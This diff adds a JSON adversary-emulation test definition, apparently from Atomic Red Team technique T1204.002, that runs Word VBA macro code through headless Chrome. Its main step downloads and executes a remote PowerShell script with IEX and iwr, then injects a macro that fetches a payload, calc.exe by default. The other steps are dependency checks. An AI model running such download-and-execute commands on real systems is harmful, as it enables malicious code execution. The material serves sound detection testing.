@@ -1,0 +1,150 @@
+{
+  "id": "a19ee671-ed98-4e9d-b19c-d1954a51585a",
+  "name": "Headless Chrome code execution via VBA",
+  "description": "This module uses Google Chrome combined with ScriptControl to achieve code execution. It spawns a local\nwebserver hosting our malicious payload. Headless Google Chrome will then reach out to this webserver\nand pull down the script and execute it. By default the payload will execute calc.exe on the system.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "1175dc52-0dbf-4919-843a-9be9a58b85a7",
+      "type": "execute-command",
+      "data": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1204.002\\src\\chromeexec-macrocode.txt\" -officeProduct \"Word\" -sub \"ExecChrome\"\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "70ab9cb7-65f7-4c65-a8ee-a0544b4ae230",
+      "type": "execute-command",
+      "data": {
+        "command": "Stop-Process -name mshta\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "ca4cf8fe-04c7-4070-a5d2-92149c9d8c17",
+      "name": "Check dependency 1/2",
+      "description": "Microsoft Word must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "try {\n  $wdApp = New-Object -COMObject \"Word.Application\"\n  Stop-Process -Name \"winword\"\n  exit 0 } catch { exit 1 }\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "dbeb7b17-4c9e-4d0e-b9cd-0ba430ad5f20",
+      "name": "Resolve dependency 1/2",
+      "description": "Microsoft Word must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "2de1fd1b-191b-432b-988c-23cc9e3c96bd",
+      "name": "Re-check dependency 1/2",
+      "description": "Microsoft Word must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "try {\n  $wdApp = New-Object -COMObject \"Word.Application\"\n  Stop-Process -Name \"winword\"\n  exit 0 } catch { exit 1 }\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "bd833842-ffa3-46bb-af16-09b800261754",
+      "name": "Check dependency 2/2",
+      "description": "Google Chrome must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "try {\n  $chromeInstalled = (Get-Item (Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe').'(Default)').VersionInfo.FileName\n  exit 0\n} catch { exit 1 }\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "757cc4f9-4c42-4c41-b8f8-f4f2fdac2704",
+      "name": "Resolve dependency 2/2",
+      "description": "Google Chrome must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "Write-Host \"You will need to install Google Chrome manually to meet this requirement\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "a8bd4ce1-da00-42f3-832b-280a29be661e",
+      "name": "Re-check dependency 2/2",
+      "description": "Google Chrome must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "try {\n  $chromeInstalled = (Get-Item (Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe').'(Default)').VersionInfo.FileName\n  exit 0\n} catch { exit 1 }\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "1175dc52-0dbf-4919-843a-9be9a58b85a7",
+      "p": "on-success",
+      "o": "70ab9cb7-65f7-4c65-a8ee-a0544b4ae230"
+    },
+    {
+      "s": "1175dc52-0dbf-4919-843a-9be9a58b85a7",
+      "p": "on-failure",
+      "o": "70ab9cb7-65f7-4c65-a8ee-a0544b4ae230"
+    },
+    {
+      "s": "ca4cf8fe-04c7-4070-a5d2-92149c9d8c17",
+      "p": "on-success",
+      "o": "1175dc52-0dbf-4919-843a-9be9a58b85a7"
+    },
+    {
+      "s": "ca4cf8fe-04c7-4070-a5d2-92149c9d8c17",
+      "p": "on-failure",
+      "o": "dbeb7b17-4c9e-4d0e-b9cd-0ba430ad5f20"
+    },
+    {
+      "s": "dbeb7b17-4c9e-4d0e-b9cd-0ba430ad5f20",
+      "p": "on-success",
+      "o": "2de1fd1b-191b-432b-988c-23cc9e3c96bd"
+    },
+    {
+      "s": "2de1fd1b-191b-432b-988c-23cc9e3c96bd",
+      "p": "on-failure",
+      "o": "1175dc52-0dbf-4919-843a-9be9a58b85a7"
+    },
+    {
+      "s": "bd833842-ffa3-46bb-af16-09b800261754",
+      "p": "on-success",
+      "o": "1175dc52-0dbf-4919-843a-9be9a58b85a7"
+    },
+    {
+      "s": "bd833842-ffa3-46bb-af16-09b800261754",
+      "p": "on-failure",
+      "o": "757cc4f9-4c42-4c41-b8f8-f4f2fdac2704"
+    },
+    {
+      "s": "757cc4f9-4c42-4c41-b8f8-f4f2fdac2704",
+      "p": "on-success",
+      "o": "a8bd4ce1-da00-42f3-832b-280a29be661e"
+    },
+    {
+      "s": "a8bd4ce1-da00-42f3-832b-280a29be661e",
+      "p": "on-failure",
+      "o": "1175dc52-0dbf-4919-843a-9be9a58b85a7"
+    }
+  ],
+  "tags": [
+    "T1204.002",
+    "atomic-red-team"
+  ]
+}
